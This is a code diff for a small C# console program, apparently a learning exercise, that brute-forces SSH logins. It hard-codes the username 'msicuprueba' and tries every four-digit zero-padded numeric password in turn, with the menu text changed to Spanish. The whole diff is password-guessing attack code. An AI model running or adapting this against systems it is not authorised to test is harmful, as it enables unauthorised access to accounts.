@@ -15,12 +15,12 @@ namespace sshfb
         {
             PrintVersoin();
             Console.WriteLine();
-            Console.WriteLine("1) Simple SSH session example using SshStream");
+            Console.WriteLine("1) Conectate a ssh con fuerza bruta.. mas burta que fuerza");
             Console.WriteLine();
 
         INPUT:
             int i = -1;
-            Console.Write("Please enter your choice: ");
+            Console.Write("Por favor introduce 1: ");
             try
             {
                 i = int.Parse(Console.ReadLine());
@@ -38,7 +38,7 @@ namespace sshfb
                     break;
 
                 default:
-                    Console.Write("Bad input, ");
+                    Console.Write("Algo salio mal!!, ");
                     goto INPUT;
             }
         }
@@ -53,7 +53,7 @@ namespace sshfb
             //Console.Write("User: ");
             user = "msicuprueba";
             //Console.Write("Password: ");
-            pass = "8000";
+            pass = "0";
             //Console.WriteLine();
         }
 
@@ -72,48 +72,32 @@ namespace sshfb
 
                     string pp = Convert.ToString(i);
                     int length = pp.Length;
-                    //string length1 = Convert.ToString(length);
+                   
                     switch (length)
                     {
                         case 1:
                             pass = "000" + pp;
-                            //.RedirectToConsole();
-                            //Console.Write("Connecting...");
-
-                            //sshShell.Connect();
-                            //Console.WriteLine("OK " + pass);
+                          
                             break;
                         case 2:
                             pass = "00" + pp;
-                            //sshShell.RedirectToConsole();
-                            //Console.Write("Connecting...");
-
-                            //sshShell.Connect();
-                            //Console.WriteLine("OK " + pass);
+                           
                             break;
                         case 3:
                             pass = "0" + pp;
-                            //sshShell.RedirectToConsole();
-                            //Console.Write("Connecting...");
-
-                            //sshShell.Connect();
-                            //Console.WriteLine("OK " + pass);
+                            
                             break;
                         case 4:
                             pass = pp;
-                            //sshShell.RedirectToConsole();
-                            //Console.Write("Connecting...");
-
-                            //sshShell.Connect();
-                            //Console.WriteLine("OK " + pass);
+                           
                             break;
                         default:
                             Console.WriteLine("fuera de rango");
                                 break;
                     }
+
                     
-                    //pass = pp;
-                    
+                    sshShell.Password = pass;
                     sshShell.RedirectToConsole();
                     Console.Write("Connecting...");
 
@@ -130,15 +114,16 @@ namespace sshfb
 
                     sshShell.Connect();
                     Console.WriteLine("OK");
-                    */
+                   
                     while (sshShell.ShellOpened)
                         Thread.Sleep(500);
                     Console.Write("Disconnecting...");
                     sshShell.Close();
                     Console.WriteLine("OK");
-                    
+                    */
+
                 }
-            catch (Exception ex)
+                catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
                     Console.WriteLine("OK " + pass);
